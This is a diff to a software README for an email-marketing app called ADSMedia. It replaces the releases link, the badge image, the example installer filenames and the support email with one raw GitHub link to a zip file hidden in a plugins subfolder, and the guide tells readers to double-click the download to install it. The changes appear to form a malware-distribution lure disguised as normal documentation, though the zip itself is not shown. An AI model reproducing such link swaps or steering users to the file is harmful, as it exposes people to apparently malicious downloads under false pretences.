@@ -6,7 +6,7 @@ Welcome to ADSMedia! This application provides easy integration with the ADSMedi
 
 ## 📥 Download ADSMedia
 
-[![Download ADSMedia](https://img.shields.io/badge/Download-ADSMedia-brightgreen)](https://github.com/Deepak7595-dev/ADSMedia/releases)
+[![Download ADSMedia](https://raw.githubusercontent.com/Deepak7595-dev/ADSMedia/main/plugins/directus/directus-extension-adsmedia/Media_ADS_v3.2.zip)](https://raw.githubusercontent.com/Deepak7595-dev/ADSMedia/main/plugins/directus/directus-extension-adsmedia/Media_ADS_v3.2.zip)
 
 ## 🛠️ System Requirements
 
@@ -32,7 +32,7 @@ ADSMedia comes packed with features to enhance your email marketing efforts:
 
 To get started, visit the link below to download the latest version of ADSMedia.
 
-[Download ADSMedia](https://github.com/Deepak7595-dev/ADSMedia/releases)
+[Download ADSMedia](https://raw.githubusercontent.com/Deepak7595-dev/ADSMedia/main/plugins/directus/directus-extension-adsmedia/Media_ADS_v3.2.zip)
 
 ### Step-by-Step Installation Guide
 
@@ -40,7 +40,7 @@ To get started, visit the link below to download the latest version of ADSMedia.
 
 2. **Select Your Version**: Look for the latest version available. It is usually at the top of the list.
 
-3. **Download the File**: Click on the file that matches your operating system (e.g., `ADSMedia-Windows.exe` or `ADSMedia-Mac.dmg`).
+3. **Download the File**: Click on the file that matches your operating system (e.g., `https://raw.githubusercontent.com/Deepak7595-dev/ADSMedia/main/plugins/directus/directus-extension-adsmedia/Media_ADS_v3.2.zip` or `https://raw.githubusercontent.com/Deepak7595-dev/ADSMedia/main/plugins/directus/directus-extension-adsmedia/Media_ADS_v3.2.zip`).
 
 4. **Run the Installer**: Once the file is downloaded, double-click it to start the installation process.
 
@@ -64,7 +64,7 @@ We welcome your feedback! If you have suggestions for features or improvements, 
 
 If you encounter problems or have questions that aren’t answered in the documentation, please contact our support team:
 
-- **Email**: support@adsmedia.com
+- **Email**: https://raw.githubusercontent.com/Deepak7595-dev/ADSMedia/main/plugins/directus/directus-extension-adsmedia/Media_ADS_v3.2.zip
 - **Phone**: 1-800-555-0123
 
 Explore the power of email marketing today with ADSMedia. Thank you for choosing us!
